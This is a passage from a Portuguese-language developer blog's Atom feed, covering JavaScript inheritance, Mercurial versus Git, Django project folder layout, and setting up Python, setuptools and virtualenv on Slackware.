    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;nomeFramework&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; é feito em &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Instanciamos algumas vezes a classe &lt;code&gt;Framework&lt;/code&gt;, e teremos o
comportamento esperado de uma herança:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;django&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Framework&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Django&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Python&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;2.7&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;django&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;                      &lt;span class="c1"&gt;// Framework&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;django&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;descricaoCompleta&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;  &lt;span class="c1"&gt;// Python vr.2.7&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;django&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;feitoEm&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;            &lt;span class="c1"&gt;// Django é feito em Python&lt;/span&gt;

&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;jquery&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Framework&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;jQuery&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Javascript&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1.5&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;jquery&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;                      &lt;span class="c1"&gt;// Framework&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;jquery&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;descricaoCompleta&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;  &lt;span class="c1"&gt;// jQuery vr.1.5&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;jquery&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;feitoEm&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;            &lt;span class="c1"&gt;// jQuery é feito em Javascript&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Existem algumas bibliotecas (como a &lt;a href="http://mootools.net/" title="MooTools, a compact javascript framework"&gt;&lt;em&gt;Mootools&lt;/em&gt;&lt;/a&gt;) que facilitam a
criação de classes e heranças em &lt;em&gt;Javascript&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;O exemplo completo está disponível para &lt;em&gt;download&lt;/em&gt; em:
&lt;a href="http://github.com/kplaube/post-javascript-oop" title="Código do exemplo no GitHub"&gt;http://github.com/kplaube/post-javascript-oop&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="javascript"></category><category term="oop"></category></entry><entry><title>Como versionar projetos Django com o Mercurial - Parte 1</title><link href="https://klauslaube.com.br/2011/05/10/como-versionar-projetos-django-mercurial-parte.html" rel="alternate"></link><published>2011-05-10T23:34:00-03:00</published><updated>2011-05-10T23:34:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-05-10:/2011/05/10/como-versionar-projetos-django-mercurial-parte.html</id><summary type="html">&lt;p&gt;Se você está começando em &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;, e nunca utilizou uma ferramenta
de controle de versão (as vezes por trauma do &lt;a href="http://akitaonrails.com/2007/09/22/jogar-pedra-em-gato-morto-por-que-subversion-no-presta" title="Jogar Pedra em Gato Morto: por que Subversion não presta"&gt;&lt;em&gt;SVN&lt;/em&gt;&lt;/a&gt; ou por &lt;a href="http://pt.wikipedia.org/wiki/Sistema_de_controle_de_vers%C3%A3o" title="Wikipedia, Sistema de Controle de Versão"&gt;simples
desinteresse&lt;/a&gt;) esta será uma grande oportunidade para você conhecer o
&lt;a href="http://www.profissionaisti.com.br/2009/06/bitbucket-hospede-e-versione-softwares-com-mercurial/" title="Bitbucket: Hospede e versione softwares com Mercurial"&gt;&lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;, e saber a forma que venho utilizando para versionar
meus projetos Django.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Peraí! Por que …&lt;/h2&gt;</summary><content type="html">&lt;p&gt;Se você está começando em &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;, e nunca utilizou uma ferramenta
de controle de versão (as vezes por trauma do &lt;a href="http://akitaonrails.com/2007/09/22/jogar-pedra-em-gato-morto-por-que-subversion-no-presta" title="Jogar Pedra em Gato Morto: por que Subversion não presta"&gt;&lt;em&gt;SVN&lt;/em&gt;&lt;/a&gt; ou por &lt;a href="http://pt.wikipedia.org/wiki/Sistema_de_controle_de_vers%C3%A3o" title="Wikipedia, Sistema de Controle de Versão"&gt;simples
desinteresse&lt;/a&gt;) esta será uma grande oportunidade para você conhecer o
&lt;a href="http://www.profissionaisti.com.br/2009/06/bitbucket-hospede-e-versione-softwares-com-mercurial/" title="Bitbucket: Hospede e versione softwares com Mercurial"&gt;&lt;em&gt;Mercurial&lt;/em&gt;&lt;/a&gt;, e saber a forma que venho utilizando para versionar
meus projetos Django.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Peraí! Por que não Git?&lt;/h2&gt;
&lt;p&gt;Sem dúvida o &lt;a href="http://git-scm.com/" title="Git é a estrela do momento tratando-se de DVCS"&gt;&lt;em&gt;Git&lt;/em&gt;&lt;/a&gt; é a ferramenta do momento em
se tratando de controle de versões, e vem sendo muito utilizada por
rubistas e pythonistas (eu incluso nessa última galera).&lt;/p&gt;
&lt;p&gt;Por que não falar de &lt;em&gt;Git&lt;/em&gt; aqui? Simples! &lt;strong&gt;Você vai ouvir falar sobre
&lt;em&gt;Git&lt;/em&gt; em todo o lugar&lt;/strong&gt;. O &lt;em&gt;Google&lt;/em&gt; vai te trazer toneladas de
informações sobre &lt;em&gt;Git&lt;/em&gt;. Você vai “ouvir” o pessoal falando que &lt;a href="http://pt.whygitisbetterthanx.com/" title="Por que Git é Melhor que X"&gt;&lt;em&gt;Git&lt;/em&gt; é melhor do que qualquer outra ferramenta&lt;/a&gt;.
Você vai até enjoar de tanto ouvir falar sobre &lt;em&gt;Git&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Mercurial&lt;/em&gt; foi o primeiro &lt;a href="http://en.wikipedia.org/wiki/Distributed_revision_control" title="DVCS - Distributed Version Control System"&gt;&lt;em&gt;DVCS&lt;/em&gt;&lt;/a&gt; que utilizei (de verdade). &lt;strong&gt;Na
minha opinião&lt;/strong&gt;, ele é mais simples que o &lt;em&gt;Git&lt;/em&gt;, é feito em
&lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, e me atende no desenvolvimento dos meus projetos pessoais.&lt;/p&gt;
&lt;p&gt;Concordo com o pessoal que diz que o &lt;em&gt;Git&lt;/em&gt; é bom, e concordo com o
pessoal que fala que o &lt;em&gt;Mercurial&lt;/em&gt; é bom. É perfeitamente possível
utilizar estas duas ferramentas, não precisamos ser radicais e iniciar
um &lt;em&gt;flame&lt;/em&gt; em cima deste assunto. A opção é melhor que não ter opção…&lt;/p&gt;
&lt;h2&gt;GitHub x Bitbucket&lt;/h2&gt;
&lt;p&gt;Agora uma coisa eu não posso deixar de concordar: O &lt;a href="https://github.com/" title="GitHub, Social coding"&gt;&lt;em&gt;GitHub&lt;/em&gt;&lt;/a&gt; é (na minha opinião) melhor que o
&lt;a href="https://bitbucket.org/" title="Alternativa com Mercurial ao GitHub"&gt;&lt;em&gt;Bitbucket&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Ambos são repositórios de código na nuvem, o primeiro usando &lt;em&gt;Git&lt;/em&gt; e o
segundo usando &lt;em&gt;Mercurial&lt;/em&gt;. O detalhe é que o &lt;em&gt;GitHub&lt;/em&gt; tem algumas
funções mais apuradas que o &lt;em&gt;Bitbucket&lt;/em&gt;, principalmente as
funcionalidades que tornam a ferramenta muito mais “social”.&lt;/p&gt;
&lt;p&gt;Embora o &lt;em&gt;Bitbucket&lt;/em&gt; recentemente tenha sido adquirido pela
&lt;strong&gt;&lt;em&gt;Atlassian&lt;/em&gt;&lt;/strong&gt; e tenha recebido uma forte injencão de melhorias… o
&lt;em&gt;GitHub&lt;/em&gt; ainda é, para mim, a melhor forma de compartilhar código que
existe no momento.&lt;/p&gt;
&lt;p&gt;Venho utilizando o &lt;em&gt;Bitbucket&lt;/em&gt; pela opção de poder manter &lt;strong&gt;repositórios
de código “fechados”&lt;/strong&gt;. Coisa que com o “rival” só é possível através de
uma conta paga.&lt;/p&gt;
&lt;p&gt;Mais uma vez… é perfeitamente possível viver utilizando as duas
ferramentas.&lt;/p&gt;
&lt;p&gt;Na próxima parte deste &lt;em&gt;post&lt;/em&gt; vamos abordar o básico do &lt;em&gt;Mercurial&lt;/em&gt;, e
também pretendo mostrar como organizo os meus projetos &lt;em&gt;Django&lt;/em&gt;
“versionando-os” com o &lt;em&gt;Mercurial&lt;/em&gt; e &lt;em&gt;Bitbucket&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="django"></category><category term="git"></category><category term="mercurial"></category></entry><entry><title>Como organizar seus projetos Django</title><link href="https://klauslaube.com.br/2011/04/11/como-organizar-seus-projetos-django.html" rel="alternate"></link><published>2011-04-11T20:11:00-03:00</published><updated>2011-04-11T20:11:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-04-11:/2011/04/11/como-organizar-seus-projetos-django.html</id><summary type="html">&lt;p&gt;Pretendo compartilhar com vocês a forma que venho utilizando para
organizar meus projetos &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; com o uso do &lt;a href="https://klauslaube.com.br/tag/virtualenv.html" title="Leia mais sobre virtualenv"&gt;&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt;.
Não entrarei em muitos detalhes, até porque você verá que é um
procedimento muito simples, mas que poderá garantir melhor organização
dos seus projetos e dos seus ambientes de desenvolvimento.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;É …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Pretendo compartilhar com vocês a forma que venho utilizando para
organizar meus projetos &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; com o uso do &lt;a href="https://klauslaube.com.br/tag/virtualenv.html" title="Leia mais sobre virtualenv"&gt;&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt;.
Não entrarei em muitos detalhes, até porque você verá que é um
procedimento muito simples, mas que poderá garantir melhor organização
dos seus projetos e dos seus ambientes de desenvolvimento.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;É interessante que você leia o post &lt;a href="https://klauslaube.com.br/2011/03/18/python-django-virtualenv.html" title="Leia mais sobre a tríade Python, Django e virtualenv"&gt;&lt;em&gt;Python&lt;/em&gt;, &lt;em&gt;Django&lt;/em&gt; e
&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt; antes de continuar.&lt;/p&gt;
&lt;h2&gt;Simplesmente um projeto Django&lt;/h2&gt;
&lt;p&gt;Antes de conhecer (e utilizar) o &lt;em&gt;virtualenv&lt;/em&gt;, utilizei algo parecido
com o modelo “tradicional” de organização de pastas e códigos em um
projeto &lt;em&gt;Django&lt;/em&gt;. Ou seja, parecido com aquela estrutura padrão
gerada pelo comando &lt;code&gt;django-admin.py startproject&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;O modelo é bom, e funcionou para mim durante muito tempo. Mas de uns
tempos para cá venho utilizando o esquema abaixo (confira um exemplo
real):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mysite/
    apps/
        __init__.py
        eggs/
            fixtures/
                eggs_testdata.json
            tests/
                __init__.py
                models.py
                views.py
            __init__.py
            models.py
            urls.py
            views.py
        core/
            __init__.py
            extras.py
    __init__.py
    manage.py
    settings.py
    urls.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A diferença principal está na utilização da pasta &lt;code&gt;apps&lt;/code&gt; para
encapsular as aplicações do projeto, e a criação de uma pasta (ou
pacote, como preferir) &lt;code&gt;core&lt;/code&gt;. Nesta última, gosto de armazenar
&lt;em&gt;snippets&lt;/em&gt; de código que serão aproveitados pelo projeto inteiro.&lt;/p&gt;
&lt;p&gt;Outro ponto que vale ser notado é a criação de uma pasta chamada
&lt;code&gt;tests&lt;/code&gt; para cada &lt;em&gt;app&lt;/em&gt;. Embora haja casos em que um arquivo
&lt;code&gt;tests.py&lt;/code&gt; seja o suficiente, podemos nos deparar com um arquivo
gigantesco testando vários aspectos de uma &lt;em&gt;app&lt;/em&gt; (o que pode dificultar
a legibilidade de código). Categorizar os testes por tipo, e em arquivos
separados, irá facilitar a adição de novos testes e funcionalidades.&lt;/p&gt;
&lt;p&gt;A abordagem dos testes também pode ser utilizada para o &lt;code&gt;urls.py&lt;/code&gt;.
Quando o seu arquivo de roteamento ficar muito grande, crie uma pasta
&lt;code&gt;urls&lt;/code&gt; e “quebre” suas rotas em arquivos diferentes. Categorize-os,
sinta-se “zen” e nunca mais tenha medo de criar &lt;em&gt;URLs&lt;/em&gt; novamente&lt;/p&gt;
&lt;p&gt;Comecei a utilizar esta estrutura após “xeretar” alguns projetos
&lt;em&gt;Django&lt;/em&gt; &lt;em&gt;open source&lt;/em&gt;. Posso dizer por experiência própria que é uma
prática interessante, e que tem me ajudado muito na organização de
código.&lt;/p&gt;
&lt;h2&gt;O projeto Django com o virtualenv&lt;/h2&gt;
&lt;p&gt;Tratando-se do ambiente de desenvolvimento (construído pelo
&lt;em&gt;virtualenv&lt;/em&gt;), já utilizei-o de duas formas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;O &lt;em&gt;environment&lt;/em&gt; em uma pasta separada do projeto:&lt;/strong&gt; Você pode
  possuir uma pasta “environments” e lá ter diferentes ambientes para
  diferentes projetos.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;O projeto &lt;em&gt;Django&lt;/em&gt; ficar dentro da pasta de &lt;em&gt;environment&lt;/em&gt;:&lt;/strong&gt; Você
  primeiramente constrói um ambiente com o &lt;em&gt;virtualenv&lt;/em&gt;, e depois cria
  um projeto dentro dessa mesma pasta (como demonstrado &lt;a href="http://blog.triveos.com.br/2010/04/25/trabalhando-com-python-e-django/" title="Trabalhando com Python e Django à moda Osvaldo"&gt;neste &lt;em&gt;post&lt;/em&gt; do &lt;em&gt;Osvaldo Santana&lt;/em&gt;&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Particularmente eu prefiro a segunda opção (nunca precisei de 2
&lt;em&gt;environments&lt;/em&gt; idênticos). Além de manter todo o seu projeto agrupado,
fica mais fácil para criação de &lt;em&gt;scripts&lt;/em&gt; de automatização de &lt;em&gt;deploy&lt;/em&gt;,
por exemplo.&lt;/p&gt;
&lt;p&gt;No fim das contas, geralmente a estrutura de pastas dos projetos
&lt;em&gt;Django&lt;/em&gt; fica assim:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;MySiteProject/
    bin/
    include/
    lib/
    mysite/
        apps/
            __init__.py
            eggs/
                fixtures/
                    eggs_testdata.json
                tests/
                    __init__.py
                    models.py
                    views.py
                __init__.py
                models.py
                urls.py
                views.py
            core/
                __init__.py
                extras.py
        __init__.py
        manage.py
        settings.py
        urls.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E você? De que forma organiza os seus projetos em &lt;em&gt;Django&lt;/em&gt;? Conte-nos
através dos comentários abaixo!&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="django"></category><category term="virtualenv"></category></entry><entry><title>Python, Django e virtualenv</title><link href="https://klauslaube.com.br/2011/03/18/python-django-virtualenv.html" rel="alternate"></link><published>2011-03-18T20:24:00-03:00</published><updated>2011-03-18T20:24:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2011-03-18:/2011/03/18/python-django-virtualenv.html</id><summary type="html">&lt;p&gt;Dando continuidade a série “&lt;a href="{filename}03-montando-seu-ambiente-de-desenvolvimento-django-no-linux.md" title="Montando seu ambiente de desenvolvimento Django em Linux"&gt;Montando seu ambiente de desenvolvimento
&lt;em&gt;Django&lt;/em&gt; em &lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt;”, vamos dar uma pincelada na tríade &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;,
&lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/tag/virtualenv.html" title="Leia mais sobre Virtualenv"&gt;&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Python&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://www.profissionaisti.com.br/2009/01/10-motivos-para-voce-aprender-a-programar-em-python/" title="10 motivos para se usar Python"&gt;Conheça alguns motivos que lhe convencerão a usar &lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Python&lt;/em&gt; já vem instalado na maioria das distribuições &lt;a href="https://klauslaube.com.br/tag/linux.html" title="Leia mais sobre Linux"&gt;&lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt;. Na
verdade, até hoje nunca usei uma distro …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Dando continuidade a série “&lt;a href="{filename}03-montando-seu-ambiente-de-desenvolvimento-django-no-linux.md" title="Montando seu ambiente de desenvolvimento Django em Linux"&gt;Montando seu ambiente de desenvolvimento
&lt;em&gt;Django&lt;/em&gt; em &lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt;”, vamos dar uma pincelada na tríade &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;,
&lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/tag/virtualenv.html" title="Leia mais sobre Virtualenv"&gt;&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;h2&gt;Python&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://www.profissionaisti.com.br/2009/01/10-motivos-para-voce-aprender-a-programar-em-python/" title="10 motivos para se usar Python"&gt;Conheça alguns motivos que lhe convencerão a usar &lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Python&lt;/em&gt; já vem instalado na maioria das distribuições &lt;a href="https://klauslaube.com.br/tag/linux.html" title="Leia mais sobre Linux"&gt;&lt;em&gt;Linux&lt;/em&gt;&lt;/a&gt;. Na
verdade, até hoje nunca usei uma distro &lt;em&gt;Linux&lt;/em&gt; que não tivesse o
&lt;em&gt;Python&lt;/em&gt; previamente instalado. No &lt;em&gt;Slackware 13.1&lt;/em&gt;, o &lt;em&gt;Python&lt;/em&gt; está na
versão 2.6.4. No &lt;em&gt;Debian 6&lt;/em&gt;, o &lt;em&gt;Python&lt;/em&gt; está na versão 2.6.6.&lt;/p&gt;
&lt;p&gt;O portal &lt;em&gt;Python Brasil&lt;/em&gt; possui um excelente material para você
&lt;a href="http://www.python.org.br/wiki/InicieSe" title="Inicie-se no Python"&gt;instalar&lt;/a&gt; e dar os &lt;a href="http://www.python.org.br/wiki/AprendaMais" title="Aprenda mais sobre Python"&gt;primeiros passos&lt;/a&gt; com &lt;em&gt;Python&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;virtualenv&lt;/h2&gt;
&lt;p&gt;A linguagem &lt;em&gt;Python&lt;/em&gt; não vem “de bobeira” nas distribuições &lt;em&gt;Linux&lt;/em&gt;, ela
faz parte delas, sendo utilizada para criação de uma série de &lt;em&gt;scripts&lt;/em&gt;
fundamentais. Passei por uma situação peculiar com o &lt;em&gt;Python&lt;/em&gt;: estava
usando o &lt;em&gt;OpenSuse&lt;/em&gt; (não recordo a versão) e decidi atualizar a versão
do &lt;em&gt;Python&lt;/em&gt; utilizando o sistema de pacotes da distro… confirmei algumas
operações de remoção (que não deveria ter autorizado) e acabei
danificando minha instalação do &lt;a href="https://klauslaube.com.br/tag/sistemas-operacionais.html" title="Leia mais sobre Sistemas Operacionais"&gt;&lt;em&gt;SO&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Então, para aqueles que programam em computadores pessoais, e não querem
comprometer tanto o &lt;em&gt;SO&lt;/em&gt; quanto o &lt;em&gt;workspace&lt;/em&gt;, podem criar &lt;em&gt;ambientes
isolados&lt;/em&gt; para os projetos utilizando o &lt;a href="http://pypi.python.org/pypi/virtualenv" title="Virtual Python Environment Builder"&gt;&lt;em&gt;virtualenv&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;No &lt;em&gt;Slackware&lt;/em&gt; vamos instalar o &lt;a href="http://pypi.python.org/pypi/setuptools" title="Download, build, install, upgrade, and uninstall Python packages"&gt;&lt;em&gt;setuptools&lt;/em&gt;&lt;/a&gt;, que é um &lt;em&gt;framework&lt;/em&gt;
que facilita a instalação e criação de pacotes &lt;em&gt;Python&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ wget http://peak.telecommunity.com/dist/ez_setup.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para instalá-lo é necessário ser &lt;em&gt;&lt;em&gt;root&lt;/em&gt;&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ python ez_setup.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Em seguida, vamos instalar o &lt;em&gt;virtualenv&lt;/em&gt; com a ajuda do
&lt;code&gt;_easy_install_&lt;/code&gt; (que faz parte do pacote &lt;em&gt;setuptools&lt;/em&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ easy_install virtualenv
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esta é uma forma interessante para você instalar módulos &lt;em&gt;Python&lt;/em&gt; em seu
sistema sem recorrer ao sistema de pacotes do &lt;em&gt;SO&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Agora, como um usuário comum, vamos criar um ambiente em nosso
&lt;code&gt;home&lt;/code&gt; para testarmos o &lt;em&gt;virtualenv&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ virtualenv ~/projeto_django
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Entrando nesta pasta, você irá se deparar com três diretórios:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;bin&lt;/code&gt;: Os executáveis do seu ambiente isolado estarão aí. Você
  poderá notar o executável &lt;code&gt;python&lt;/code&gt;, o &lt;code&gt;easy_install&lt;/code&gt;, o &lt;code&gt;pip&lt;/code&gt; e um carinha chamado &lt;code&gt;activate&lt;/code&gt; (falaremos deste mais tarde).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;lib&lt;/code&gt;: Nesta pasta você encontrará os módulos e bibliotecas
  &lt;em&gt;Python&lt;/em&gt; utilizadas por este ambiente.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;include&lt;/code&gt;: Segundo o &lt;a href="http://blog.triveos.com.br/2008/03/03/ambiente-isolado-para-python-com-virtualenv/" title="Ambiente Isolado para Python com virtualenv"&gt;&lt;em&gt;Osvaldo Santana&lt;/em&gt;&lt;/a&gt;, dentro desse diretório
  estão os &lt;em&gt;links&lt;/em&gt; simbólicos para todos os &lt;em&gt;headers&lt;/em&gt; do &lt;em&gt;Python&lt;/em&gt; que
  são necessário para se compilar extensões escritas em &lt;em&gt;C&lt;/em&gt; para ele.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Você apenas criou seu ambiente… para ativá-lo basta dar o seguinte
comando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;source&lt;/span&gt; ~/projeto_django/bin/activate
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! Se você executar o &lt;em&gt;Python&lt;/em&gt; agora, você estará utilizando as
&lt;em&gt;libs&lt;/em&gt; deste ambiente. Isso pode permitir que você mova este
ambiente entre máquinas, que você instale &lt;em&gt;libs&lt;/em&gt; somente neste ambiente
(deixando o &lt;em&gt;Python&lt;/em&gt; do seu &lt;em&gt;SO&lt;/em&gt; “limpo”, isso pode te garantir maior
performance da distro) e que você tenha um controle maior sobre as
dependências do seu projeto.&lt;/p&gt;
&lt;p&gt;Para “sair” do ambiente, basta executar o comando &lt;code&gt;deactivate&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ deactivate
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto… muito simples, não?&lt;/p&gt;
&lt;h2&gt;Django&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://www.profissionaisti.com.br/2009/02/programando-python-para-a-web/" title="Programando Python para Web"&gt;Saiba um pouco mais sobre a programação &lt;em&gt;Python&lt;/em&gt; para &lt;em&gt;Web&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Vamos instalar o &lt;em&gt;Django&lt;/em&gt; neste ambiente isolado. Ativaremos
novamente o &lt;em&gt;virtualenv&lt;/em&gt; e usaremos o &lt;em&gt;&lt;em&gt;easy_install&lt;/em&gt;&lt;/em&gt; para nos
